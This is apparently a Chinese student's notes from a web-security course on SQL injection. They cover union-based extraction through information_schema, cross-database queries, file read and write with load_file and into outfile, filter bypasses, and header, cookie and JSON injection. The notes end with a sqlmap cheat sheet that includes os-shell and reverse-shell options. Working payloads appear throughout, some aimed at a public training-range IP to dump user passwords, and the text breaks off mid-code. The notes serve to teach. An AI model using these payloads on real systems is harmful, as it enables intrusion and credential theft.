<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>可控变量，变量未存在过滤或者过滤不严谨</p>
<p>SQL注入原理：通过参数的传递，传递数据过去，拼接到之前定义好的SQL语句中去，</p>
<p>由于能拼接，将一些恶意的SQL语句拼接上去，语句就会进行一些重新的用法，&#x3D;&#x3D;实现自定义的查询；&#x3D;&#x3D;</p>
<p><img src="https://img-blog.csdnimg.cn/ef23f2061be14307b413b3042d5bfe19.png#pic_center" alt="在这里插入图片描述"></p>
<p>另外如果没有上面图中的mysql_query这个语句去执行的话，也不能成功，带入数据库才行；、</p>
<p>课上提问：  可以注入的点</p>
<p><img src="https://img-blog.csdnimg.cn/94adb867a5cf4e7c903a0a502b666086.png#pic_center" alt="在这里插入图片描述"></p>
<p>答案是1、2、3；<br>        答案4也可以，可能是post注入，变量以post提交；</p>
<p>课上提问：</p>
<p><img src="https://img-blog.csdnimg.cn/741f9a395d4b46369c3b0bb950af7ffd.png#pic_center" alt="在这里插入图片描述"></p>
<p>答案是2、3；<br>      答案1，在y后面加 and 1&#x3D;1 实现的是对y的注入，需要在x的后面加and 1&#x3D;1，才能实现对参数x的注入；<br>       答案4，都没有参数x，怎么可能会有注入；</p>
<h3 id="靶场环境sqlilabs"><a href="#靶场环境sqlilabs" class="headerlink" title="靶场环境sqlilabs"></a>靶场环境sqlilabs</h3><p>搭建第一个SQL注入学习靶场环境</p>
<p>搭建的是sqlilabs，&#x3D;&#x3D;注意PHP版本为5.4.45以上7以下&#x3D;&#x3D;和数据库修改文件，导入配置文件</p>
<h3 id="正片"><a href="#正片" class="headerlink" title="正片"></a>正片</h3><img src="https://img-blog.csdnimg.cn/b1e5f878a8874294a402fa5f44824c34.png#pic_center" alt="MySQL注入" style="zoom:80%;" />

<p>&#x3D;&#x3D;注意 ：&#x3D;&#x3D;在注入之前需要知道网页语言，数据库类型，有源码更好</p>
<p>信息 ：MySQL注入  MYSQL数据库</p>
<pre><code>数据库A=网站A
    表名
        列名
            数据
数据库B=网站B
…
数据库C=网站C
…
</code></pre>
<p>必要知识点：</p>
<p>1 .在MYSQL5.0以上版本中，mysql存在一个自带数据库名为information_schema</p>
<p>2 .information_schema.tables：记录所有表名信息的表<br>           information_schema.columns：记录所有列名信息的表</p>
<p>table_name：表名<br>        column_name：列名<br>        table_schema：数据库名</p>
<p>补充：如何判断注入点？</p>
<blockquote>
<p>老办法：<br>and 1&#x3D;1 页面正常<br>and 1&#x3D;2 页面错误</p>
</blockquote>
<blockquote>
<p>新办法：  随便输入<br>select * from users where id&#x3D;1daadda LIMIT 0,1<br>xxx&#x2F;?&#x3D;id&#x3D;&#x3D;&#x3D;1daadda&#x3D;&#x3D;<br>如果对网站有影响，和原来网站有差别，证明他代入数据库查询了，证明了会有漏洞；<br>如果没有差别，网站不检测你输入的参数即不能传递参数，说明没有漏洞。&#x3D;&#x3D;不太准确&#x3D;&#x3D;</p>
</blockquote>
<p>​		如果报了404错误或跳转，说明网站对输入参数检测了，大部分没有漏洞。</p>
<p>猜解列名数量order by</p>
<blockquote>
<p>219.153.49.228:42123&#x2F;new_list.php?id&#x3D;1 order by 4</p>
<p>数字小于等于列数，网页不报错，反之会报错</p>
</blockquote>
<p>开始信息收集</p>
<blockquote>
<p>数据库版本：version() -&gt; 5.7.22-0ubuntu0.16.04.1<br>数据库名字：database() -&gt; mozhe_Discuz_StormGroup<br>数据库用户：user() -&gt; root@localhost<br>操作系统：@@version_compile_os -&gt; Linux</p>
<p>查询指定数据库名mozhe_Discuz_StormGroup下的表名信息：<br><a target="_blank" rel="noopener" href="http://219.153.49.228:43123/new_list.php?id=-1">http://219.153.49.228:43123/new_list.php?id=-1</a><br>union select 1,group_concat(table_name),3,4 from information_schema.tables<br>where table_schema&#x3D;‘mozhe_Discuz_StormGroup’</p>
<p>在这里插入图片描述</p>
<p>查询指定表名StormGroup_member下的列名信息：<br><a target="_blank" rel="noopener" href="http://219.153.49.228:43123/new_list.php?id=-1">http://219.153.49.228:43123/new_list.php?id=-1</a><br>union select 1,group_concat(column_name),3,4 from information_schema.columns where table_name&#x3D;‘StormGroup_member’</p>
<p>查询指定表名StormGroup_member下的数据：<br><a target="_blank" rel="noopener" href="http://219.153.49.228:43123/new_list.php?id=-1">http://219.153.49.228:43123/new_list.php?id=-1</a><br>union select 1,name,password,4 from StormGroup_member</p>
<p>在这里插入图片描述</p>
<p>MD5解密password，得到密码</p>
<p>猜解表下多个数据可以采用limit x,1<br><a target="_blank" rel="noopener" href="http://219.153.49.228:43123/new_list.php?id=-1">http://219.153.49.228:43123/new_list.php?id=-1</a> union select 1,name,password,4 from StormGroup_member limit 1,1</p>
</blockquote>
<h2 id="第十三天"><a href="#第十三天" class="headerlink" title="第十三天"></a>第十三天</h2><h3 id="图解"><a href="#图解" class="headerlink" title="图解"></a>图解</h3><img src="https://img-blog.csdnimg.cn/f44851370aa040c9bf40a8c5b2ca2034.png#pic_center" alt="第十三天" style="zoom:80%;" />

<p>前言：MYSQL注入中首先要&#x3D;&#x3D;明确当前注入点权限&#x3D;&#x3D;，高权限注入时有更多的攻击手法，有的能直接进行getshell。其中也会遇到很多阻碍，相关防御方案也要明确，所谓知己知彼，百战不殆。不论作为攻击还是防御都需要了解其中的手法和原理，这样才是一个合格的安全工作者。</p>
<h3 id="权限"><a href="#权限" class="headerlink" title="权限"></a>权限</h3><p>可以看到这个用户名时是root，是最高权限，除root之外都是普通用户<br>      高权限注入及低权限注入</p>
<p>1.跨库查询及应用思路<br>原理： 需要root型注入点， 一个网站的注入点影响到另一个网站的数据，</p>
<p>通过’ select * from schemata；’语句，查询数据库中所有数据库的名字；</p>
<p>实现跨库注入，首先需要获得跨库的数据库的名字；</p>
<blockquote>
<p>通过SQL语句注入，获得所有数据库名字；</p>
<p><a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/Less-2/?id=-1">http://127.0.0.1/sqli-labs-master/Less-2/?id=-1</a> union select 1,group_concat(schema_name),3 from information_schema.schemata</p>
<p>获取指定dvwa数据库名下的表名信息</p>
<p><a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/Less-2/?id=-1">http://127.0.0.1/sqli-labs-master/Less-2/?id=-1</a> union select 1,group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;‘dvwa’</p>
<p>获取指定dvwa数据库名下的表名users下的列名信息；</p>
<p><a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/Less-2/?id=-1">http://127.0.0.1/sqli-labs-master/Less-2/?id=-1</a> union select 1,group_concat(column_name),3 from information_schema.columns where table_name&#x3D;‘users’</p>
<p>如果直接这样写，很可能把其他数据库里面的users给查询出来，需要再做一些其他添加过滤；<br>如下：<br><a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/Less-2/?id=-1">http://127.0.0.1/sqli-labs-master/Less-2/?id=-1</a><br>union select 1,group_concat(column_name),3 from information_schema.columns where table_name&#x3D;‘users’ and table_schema&#x3D;‘dvwa’</p>
<p>获取指定dvwa下的users数据</p>
<p><a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/Less-2/?id=-1">http://127.0.0.1/sqli-labs-master/Less-2/?id=-1</a> union select 1,user,password from dvwa.users</p>
<p>跨库选择表：因为是跨库查询，需要在表前添加该表的数据库名称，否则会默认为当前库的表；</p>
</blockquote>
<h3 id="文件读写操作"><a href="#文件读写操作" class="headerlink" title="文件读写操作"></a>文件读写操作</h3><h3 id="-1"><a href="#-1" class="headerlink" title=""></a></h3><p>会用到MySQL数据库里两个内置函数，这两个函数是MySQL数据库特有的 ，</p>
<p>因为每个数据库内置的安全机制和它的功能不同，这才导致在注入的时候针对不用的数据库采取的攻击思路也不同。</p>
<p>load_file(): 读取函数<br>       into outfile 或者 into dumpfile:导出函数</p>
<p>路径获取常见方法：<br>&#x3D;&#x3D;报错显示&#x3D;&#x3D;，&#x3D;&#x3D;遗留文件&#x3D;&#x3D;，&#x3D;&#x3D;漏洞报错&#x3D;&#x3D;，平台配置文件，爆破等;</p>
<blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">报错显示</span><br></pre></td></tr></table></figure>

<p>网站出现错误时，会显示路径；</p>
<p><img src="https://img-blog.csdnimg.cn/5f5a8408379a4171a633c78bb18284af.png#pic_center" alt="在这里插入图片描述"></p>
<pre><code>遗留文件
</code></pre>
<p>类似于phpinfo()文件，为了调试信息遗留的文件，命名一般为phpinfo()之类的；<br>可以用工具扫描到；</p>
<p><img src="https://img-blog.csdnimg.cn/b6a6f56d986c48c294706ef672980d67.png#pic_center" alt="在这里插入图片描述"></p>
<pre><code>漏洞报错
</code></pre>
<p>知道对方是用什么脚本程序搭建再去网上去搜索漏洞信息：phpcms爆路径、zblog爆路径；</p>
<img src="https://img-blog.csdnimg.cn/116636153caf40d3b38a42eccfa3b078.png#pic_center" alt="在这里插入图片描述" style="zoom:67%;" />

<pre><code>平台位置文件
</code></pre>
<p>搭建平台的配置文件，会记录网站的信息，包括网站储存路径，网站的域名，IP等，需要一些默认路径来进行尝试读取；</p>
<p><img src="https://img-blog.csdnimg.cn/45f32c5cb4f749c0829a16be92513dd4.png#pic_center" alt="在这里插入图片描述"></p>
<pre><code>爆破
</code></pre>
<p>实在获取不到路径，可采用常规思路爆破网站常规路径<br>windows：d:&#x2F;wwwroot&#x2F;xiaodi8<br>linux：&#x2F;var&#x2F;www&#x2F;xiaodi8</p>
<p>1.常见读取文件列表<br>注：下述SQL语句的执行，必须依赖于数据库中secure_file_priv参数，该参数指定了数据库导入和导出的安全路径。<br>         需要在mysql的配置文件my.ini文件添加secure_file_priv&#x3D;‘’</p>
<p><a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/Less-2/?id=-1">http://127.0.0.1/sqli-labs-master/Less-2/?id=-1</a> union select 1,load_file(‘d:&#x2F;<a target="_blank" rel="noopener" href="http://www.txt’),3/">www.txt’),3</a></p>
<p>2.常见读取文件列表及写入文件问题：魔术引导开关</p>
<p><a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/Less-2/?id=-1">http://127.0.0.1/sqli-labs-master/Less-2/?id=-1</a> union select 1,‘x’,3 into outfile ‘C:\phpStudy\PHPTuorial\WWW\sqli-labs-master\x.php’–+</p>
<p><img src="https://img-blog.csdnimg.cn/8b820c548a4942b7a398aa0eb6bb360f.png#pic_center" alt="在这里插入图片描述" style="zoom: 80%;" />魔术引号</p>
<p>注意：magic_quotes_gpc是php安全机制开关，在php的配置文件php.ini修改<br>当magic_quotes_gpc &#x3D; On时，输入数据中含单引号（’）、双引号（”）、反斜线（\）与 NULL（NULL 字符)等字符，都会被加上反斜线，都不会被转义。这些转义是必须的。</p>
<p><img src="https://img-blog.csdnimg.cn/c3aa79d8a0ae46febf27b5ba98d1cd04.png" alt="在这里插入图片描述"><br>绕过方法：可以采用编码或者宽字节，把路径进行十六进制编码，就不需要使用单引号，可以正常解析；<br>&#x3D;&#x3D;防注入方法&#x3D;&#x3D;</p>
<p>1.魔术引导及常见防护</p>
<p>当magic_quotes_gpc &#x3D; off时，</p>
<p>2.采用内置函数进行防护<br>            addslashes()函数也是和魔术引导一样效果<br>            is_int()函数判断变量<br>            还有更多内置函数也可以进行防护； 正常情况遇到的不多；</p>
<p>3.自定义关键字：select</p>
<p>​	$ id&#x3D;str_replace(‘select’,‘fuck’,$id)  将select转换成fuck；</p>
<p>4.WAF防护软件：安全狗，宝塔等；</p>
<img src="https://img-blog.csdnimg.cn/28e648a988f4414cb17ece38593f5280.png#pic_center" alt="在这里插入图片描述" style="zoom:80%;" />


<p>&#x3D;&#x3D;绕过方法：&#x3D;&#x3D;</p>
<p>对过滤关键字进行大小写，hex编码，叠写，等价函数替换等等</p>
<p>数据库低版本注入配合读取或暴力<br>            字典或读取；<br>            暴力查询或结合读取查询；<br>            sqlmap下的字典</p>
</blockquote>
<h2 id="第十四天：WEB漏洞—SQL注入之类型及提交注入"><a href="#第十四天：WEB漏洞—SQL注入之类型及提交注入" class="headerlink" title="第十四天：WEB漏洞—SQL注入之类型及提交注入"></a>第十四天：WEB漏洞—SQL注入之类型及提交注入</h2><p>第14天：WEB漏洞—SQL注入之类型及提交注入</p>
<p>我们一定要先明确&#x3D;&#x3D;提交数据&#x3D;&#x3D;及&#x3D;&#x3D;提交方法&#x3D;&#x3D;后再进行注入，其中提交数据类型和提交方法可以通过抓包分析获取，后续安全测试中我们也必须满足同等的操作才能进行注入。</p>
<h3 id="简要明确参数类型"><a href="#简要明确参数类型" class="headerlink" title="简要明确参数类型"></a>简要明确参数类型</h3><p>数字、字符、搜索、JSON等；<br>   其中 SQL 语句干扰符号：’   “    %     )     }  等，具体需看写法</p>
<h3 id="简要明确请求方法"><a href="#简要明确请求方法" class="headerlink" title="简要明确请求方法"></a>简要明确请求方法</h3><p>GET、POST、COOKIE、REQUEST、HTTP头等；<br>不同的请求方式，请求的数据类型、大小都不一样；</p>
<p>这个网站请求方法出现漏洞，要按照请求方法上，去测试注入；</p>
<p>1.GET请求<br>php代码，实现GET请求的演示</p>
<p>可以看到GET请求</p>
<p><img src="https://img-blog.csdnimg.cn/29a138c026054820893b8cc399f025a8.png#pic_center" alt="在这里插入图片描述"></p>
<p>2.POST请求<br>单纯的在get后面对p做请求是没办法回应的，必须做POST请求，请求的数据在请求体；</p>
<p>hackbar有工具可以去做POST请求，抓包看一下；</p>
<p>上图可以看到POST请求成功；</p>
<p>3.COOKIE请求<br>需要自己手动添加；</p>
<p><img src="https://img-blog.csdnimg.cn/adbe9befb3464952a864affd92ad1201.png#pic_center" alt="在这里插入图片描述"></p>
<p>4.&#x3D;&#x3D;REQUEST请求&#x3D;&#x3D;<br>REQUEST请求是全部接收，POST、GET和COOKIE的数据全部接收；<br>我们不清楚对方的接收方式，如果对方使用request请求，就不用管是什么请求方法了，因为request全部接收；</p>
<p>5&#x3D;&#x3D;.$_SERVER[’ ‘]&#x3D;&#x3D;<br>是php的全局变量，用来获取系统的一些值，一些信息；<br>SERVER详解</p>
<p>在这里插入图片描述</p>
<p>可以在网站的数据包里插入注入，就是HTTP头部注入，页面会执行返回数据；</p>
<p> 例如某网站可以获取你HTTP头部信息，那就再HTTP头部注入上述语句，页面可显示。</p>
<h3 id="演示案例-1"><a href="#演示案例-1" class="headerlink" title="演示案例"></a>演示案例</h3><pre><code>1.参数字符型注入测试=&gt;sqlilabs less 5 6

靶场sqlilabs less 5

靶场sqlilabs less 6在这里插入图片描述



2.POST 数据提交注入测试=&gt;sqlilabs less 11



3.COOKIE 数据提交注入测试=&gt;sqlilabs less 20
</code></pre>
<p>打开靶场sqlilabs less 20</p>
<p>在这里插入图片描述</p>
<p>改写语句，观察SQL语句；</p>
<p>在这里插入图片描述</p>
<p>这里观察php源代码，对POST注入会有过滤，所以采用cookie注入；</p>
<p>在这里插入图片描述</p>
<p>抓取数据包，采用cookie注入，爆破出了数据；</p>
<p>在这里插入图片描述</p>
<pre><code>4.HTTP 头部参数数据注入测试=&gt;sqlilabs less 18
</code></pre>
<p>打开靶场，出现了我的IP，这个页面可以检测我的IP，所以就是SERVER服务；</p>
<p>在这里插入图片描述</p>
<p>在这里插入图片描述</p>
<p>观察php源代码，发现查询方式是insert</p>
<p>在这里插入图片描述</p>
<p>抓取数据包，尝试注入点；</p>
<p>在这里插入图片描述</p>
<pre><code>5.参数 JSON 数据注入测试=&gt;本地环境代码演示
</code></pre>
<p>JSON的格式</p>
<p>在这里插入图片描述</p>
<p>对JSON进行注入测试</p>
<p>在这里插入图片描述</p>
<p>经常出现在APP中<br>测试网址</p>
<p>在这里插入图片描述</p>
<p>点击选项，抓包看一下，下面红色的JSON的数据包，更改冒号后的数据，进行注入；<br>把测试语句，写到双引号里面；</p>
<p>在这里插入图片描述<br>第15天：WEB漏洞—SQL注入之Oracle,MongoDB等注入</p>
<h2 id="第十五天：WEB漏洞—SQL注入之Oracle-MongoDB等注入"><a href="#第十五天：WEB漏洞—SQL注入之Oracle-MongoDB等注入" class="headerlink" title="第十五天：WEB漏洞—SQL注入之Oracle,MongoDB等注入"></a>第十五天：WEB漏洞—SQL注入之Oracle,MongoDB等注入</h2><p><img src="https://img-blog.csdnimg.cn/7556e0f532d54d929d4189a54e5c71c8.png" alt="第十五天"></p>
<p>工具： pangolin</p>
<p>简要学习各种数据库的注入特点</p>
<p>Access、mssql、mongoDB、postgresql、sqlite、oracle、sybase等；<br>数据库架构组成、数据库高权限操作；<br>除了access以外，其他数据库在组成方面都是</p>
<p>access数据库与其他数据库不同，它就只有自己一个数据库，往下没有数据库；<br>access数据库独立存在，每个网站都有自己的accsess数据库，所以没办法使用跨库注入；</p>
<p>access也不需要查询数据库名；<br>access很多功能都没有，例如文件读取；</p>
<pre><code>access
    表名
        列名
            数据
</code></pre>
<p>提问：什么决定了网站注入点用户权限<br>回答：当前网站的数据库用户，数据库的配置文件是谁连接的<br>演示案例</p>
<pre><code>1.Access注入介绍
</code></pre>
<p>打开墨者靶场，开始尝试注入学习</p>
<p>在这里插入图片描述</p>
<p>用sqlmap进行漏洞扫描，判断出了数据库是Access<br>        查询数据的时候，直接开始查表，</p>
<p><img src="/images/image-20230808135629172.png" alt="image-20230808135629172"></p>
<p>注入的时候只能靠暴力猜解,去猜表名；</p>
<p>猜解成功，则获取用户名和密码；</p>
<p>遗留问题：Access注入时，如果列名或表名猜解不到的情况怎么办？</p>
<pre><code>2.Mssql注入介绍
</code></pre>
<p>打开靶场</p>
<p>使用工具Pangolin观察Mssql<br>每个数据库支持的东西不一样，需要的时候自己查询</p>
<p><img src="https://img-blog.csdnimg.cn/a4c96a0685a24c7e8582e320ad6ac4f1.png#pic_center" alt="在这里插入图片描述">在这里插入图片描述</p>
<h3 id="查询Mssql手工注入"><a href="#查询Mssql手工注入" class="headerlink" title="查询Mssql手工注入"></a>查询Mssql手工注入</h3><p><img src="https://img-blog.csdnimg.cn/de2271c8495d4ef188eadffc7e458715.png" alt="在这里插入图片描述"></p>
<p>因为学习MySQ可以有助于后期学习其他数据库；<br>   Mssql语句注入；</p>
<pre><code>3.Postgresql注入介绍
</code></pre>
<p><img src="/images/image-20230808141226926.png" alt="image-20230808141226926"></p>
<p>查询PostgreSQL注入点；&#x3D;&#x3D;上网查&#x3D;&#x3D;</p>
<p>用sqlmap工具注入，查询数据库，得到用户名和密码</p>
<pre><code>5.Oracle 注入介绍
</code></pre>
<p><img src="/images/image-20230808141142715.png" alt="image-20230808141142715"></p>
<p><img src="https://img-blog.csdnimg.cn/19ddc651caa4459996b3569bd627ff02.png" alt="在这里插入图片描述"></p>
<p>注入总结</p>
<p><img src="https://img-blog.csdnimg.cn/0f0815cb44334dcab9de47fdaa9ffcc5.png" alt="在这里插入图片描述"></p>
<pre><code>6.MongoDB注入介绍
</code></pre>
<p>sqlmap不支持MongoDB</p>
<p>NoSQLAttack支持mongoDB的注入工具</p>
<h3 id="x3D-x3D-Sqlmap基本操作-x3D-x3D"><a href="#x3D-x3D-Sqlmap基本操作-x3D-x3D" class="headerlink" title="&#x3D;&#x3D;Sqlmap基本操作&#x3D;&#x3D;"></a>&#x3D;&#x3D;Sqlmap基本操作&#x3D;&#x3D;</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">基本操作笔记：</span><br><span class="line">-u  #注入点 </span><br><span class="line">-f  #指纹判别数据库类型 </span><br><span class="line">-b  #获取数据库版本信息 </span><br><span class="line">-p  #指定可测试的参数(?page=1&amp;id=2 -p &quot;page,id&quot;) </span><br><span class="line">-D &quot;&quot;  #指定数据库名 </span><br><span class="line">-T &quot;&quot;  #指定表名 </span><br><span class="line">-C &quot;&quot;  #指定字段 </span><br><span class="line">-s &quot;&quot;  #保存注入过程到一个文件,还可中断，下次恢复在注入(保存：-s &quot;xx.log&quot;　　恢复:-s &quot;xx.log&quot; --resume) </span><br><span class="line">--level=(1-5) #要执行的测试水平等级，默认为1 </span><br><span class="line">--risk=(0-3)  #测试执行的风险等级，默认为1 </span><br><span class="line">--time-sec=(2,5) #延迟响应，默认为5 </span><br><span class="line">--data #通过POST发送数据 </span><br><span class="line">--columns        #列出字段 </span><br><span class="line">--current-user   #获取当前用户名称 </span><br><span class="line">--current-db     #获取当前数据库名称 </span><br><span class="line">--users          #列数据库所有用户 </span><br><span class="line">--passwords      #数据库用户所有密码 </span><br><span class="line">--privileges     #查看用户权限(--privileges -U root) </span><br><span class="line">-U               #指定数据库用户 </span><br><span class="line">--dbs            #列出所有数据库 </span><br><span class="line">--tables -D &quot;&quot;   #列出指定数据库中的表 </span><br><span class="line">--columns -T &quot;user&quot; -D &quot;mysql&quot;      #列出mysql数据库中的user表的所有字段 </span><br><span class="line">--dump-all            #列出所有数据库所有表 </span><br><span class="line">--exclude-sysdbs      #只列出用户自己新建的数据库和表 </span><br><span class="line">--dump -T &quot;&quot; -D &quot;&quot; -C &quot;&quot;   #列出指定数据库的表的字段的数据(--dump -T users -D master -C surname) </span><br><span class="line">--dump -T &quot;&quot; -D &quot;&quot; --start 2 --top 4  # 列出指定数据库的表的2-4字段的数据 </span><br><span class="line">--dbms    #指定数据库(MySQL,Oracle,PostgreSQL,Microsoft SQL Server,Microsoft Access,SQLite,Firebird,Sybase,SAP MaxDB) </span><br><span class="line">--os      #指定系统(Linux,Windows) </span><br><span class="line">-v  #详细的等级(0-6) </span><br><span class="line">    0：只显示Python的回溯，错误和关键消息。 </span><br><span class="line">    1：显示信息和警告消息。 </span><br><span class="line">    2：显示调试消息。 </span><br><span class="line">    3：有效载荷注入。 </span><br><span class="line">    4：显示HTTP请求。 </span><br><span class="line">    5：显示HTTP响应头。 </span><br><span class="line">    6：显示HTTP响应页面的内容 </span><br><span class="line">--privileges  #查看权限 </span><br><span class="line">--is-dba      #是否是数据库管理员 </span><br><span class="line">--roles       #枚举数据库用户角色 </span><br><span class="line">--udf-inject  #导入用户自定义函数（获取系统权限） </span><br><span class="line">--union-check  #是否支持union 注入 </span><br><span class="line">--union-cols #union 查询表记录 </span><br><span class="line">--union-test #union 语句测试 </span><br><span class="line">--union-use  #采用union 注入 </span><br><span class="line">--union-tech orderby #union配合order by </span><br><span class="line">--data &quot;&quot; #POST方式提交数据(--data &quot;page=1&amp;id=2&quot;) </span><br><span class="line">--cookie &quot;用;号分开&quot;      #cookie注入(--cookies=”PHPSESSID=mvijocbglq6pi463rlgk1e4v52; security=low”) </span><br><span class="line">--referer &quot;&quot;     #使用referer欺骗(--referer &quot;http://www.baidu.com&quot;) </span><br><span class="line">--user-agent &quot;&quot;  #自定义user-agent </span><br><span class="line">--proxy &quot;http://127.0.0.1:8118&quot; #代理注入 </span><br><span class="line">--string=&quot;&quot;    #指定关键词,字符串匹配. </span><br><span class="line">--threads 　　  #采用多线程(--threads 3) </span><br><span class="line">--sql-shell    #执行指定sql命令 </span><br><span class="line">--sql-query    #执行指定的sql语句(--sql-query &quot;SELECT password FROM mysql.user WHERE user = &#x27;root&#x27; LIMIT 0, 1&quot; ) </span><br><span class="line">--file-read    #读取指定文件 </span><br><span class="line">--file-write   #写入本地文件(--file-write /test/test.txt --file-dest /var/www/html/1.txt;将本地的test.txt文件写入到目标的1.txt) </span><br><span class="line">--file-dest    #要写入的文件绝对路径 </span><br><span class="line">--os-cmd=id    #执行系统命令 </span><br><span class="line">--os-shell     #系统交互shell </span><br><span class="line">--os-pwn       #反弹shell(--os-pwn --msf-path=/opt/framework/msf3/) </span><br><span class="line">--msf-path=    #matesploit绝对路径(--msf-path=/opt/framework/msf3/) </span><br><span class="line">--os-smbrelay  # </span><br><span class="line">--os-bof       # </span><br><span class="line">--reg-read     #读取win系统注册表 </span><br><span class="line">--priv-esc     # </span><br><span class="line">--time-sec=    #延迟设置 默认--time-sec=5 为5秒 </span><br><span class="line">-p &quot;user-agent&quot; --user-agent &quot;sqlmap/0.7rc1 (http://sqlmap.sourceforge.net)&quot;  #指定user-agent注入 </span><br><span class="line">--eta          #盲注 </span><br><span class="line">/pentest/database/sqlmap/txt/</span><br><span class="line">common-columns.txt　　字段字典　　　 </span><br><span class="line">common-outputs.txt </span><br><span class="line">common-tables.txt      表字典 </span><br><span class="line">keywords.txt </span><br><span class="line">oracle-default-passwords.txt </span><br><span class="line">user-agents.txt </span><br><span class="line">wordlist.txt </span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>常用语句</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">常用语句 :</span><br><span class="line"><span class="number">1.</span>/sqlmap.py -u http:<span class="comment">//www.xxxxx.com/test.php?p=2 -f -b --current-user --current-db --users --passwords --dbs -v 0 </span></span><br><span class="line"><span class="number">2.</span>/sqlmap.py -u http:<span class="comment">//www.xxxxx.com/test.php?p=2 -b --passwords -U root --union-use -v 2 </span></span><br><span class="line"><span class="number">3.</span>/sqlmap.py -u http:<span class="comment">//www.xxxxx.com/test.php?p=2 -b --dump -T users -C username -D userdb --start 2 --stop 3 -v 2 </span></span><br><span class="line"><span class="number">4.</span>/sqlmap.py -u http:<span class="comment">//www.xxxxx.com/test.php?p=2 -b --dump -C &quot;user,pass&quot;  -v 1 --exclude-sysdbs </span></span><br><span class="line"><span class="number">5.</span>/sqlmap.py -u http:<span class="comment">//www.xxxxx.com/test.php?p=2 -b --sql-shell -v 2 </span></span><br><span class="line"><span class="number">6.</span>/sqlmap.py -u http:<span class="comment">//www.xxxxx.com/test.php?p=2 -b --file-read &quot;c:\boot.ini&quot; -v 2 </span></span><br><span class="line"><span class="number">7.</span>/sqlmap.py -u http:<span class="comment">//www.xxxxx.com/test.php?p=2 -b --file-write /test/test.txt --file-dest /var/www/html/1.txt -v 2 </span></span><br><span class="line"></span><br><span class="line"><span class="number">8.</span>/sqlmap.py -u http:<span class="comment">//www.xxxxx.com/test.php?p=2 -b --os-cmd &quot;id&quot; -v 1 </span></span><br><span class="line"><span class="number">9.</span>/sqlmap.py -u http:<span class="comment">//www.xxxxx.com/test.php?p=2 -b --os-shell --union-use -v 2 </span></span><br><span class="line"><span class="number">10.</span>/sqlmap.py -u http:<span class="comment">//www.xxxxx.com/test.php?p=2 -b --os-pwn --msf-path=/opt/framework/msf3 --priv-esc -v 1 </span></span><br><span class="line"><span class="number">11.</span>/sqlmap.py -u http:<span class="comment">//www.xxxxx.com/test.php?p=2 -b --os-pwn --msf-path=/opt/framework/msf3 -v 1 </span></span><br><span class="line"><span class="number">12.</span>/sqlmap.py -u http:<span class="comment">//www.xxxxx.com/test.php?p=2 -b --os-bof --msf-path=/opt/framework/msf3 -v 1 </span></span><br><span class="line"><span class="number">13.</span>/sqlmap.py -u http:<span class="comment">//www.xxxxx.com/test.php?p=2 --reg-add --reg-key=&quot;HKEY_LOCAL_NACHINE\SOFEWARE\sqlmap&quot; --reg-value=Test --reg-type=REG_SZ --reg-data=1 </span></span><br><span class="line"><span class="number">14.</span>/sqlmap.py -u http:<span class="comment">//www.xxxxx.com/test.php?p=2 -b --eta </span></span><br><span class="line"><span class="number">15.</span>/sqlmap.py -u <span class="string">&quot;http://192.168.136.131/sqlmap/mysql/get_str_brackets.php?id=1&quot;</span> -p id</span><br><span class="line">--prefix <span class="string">&quot;&#x27;)&quot;</span> --suffix <span class="string">&quot;AND (&#x27;abc&#x27;=&#x27;abc&quot;</span></span><br><span class="line"><span 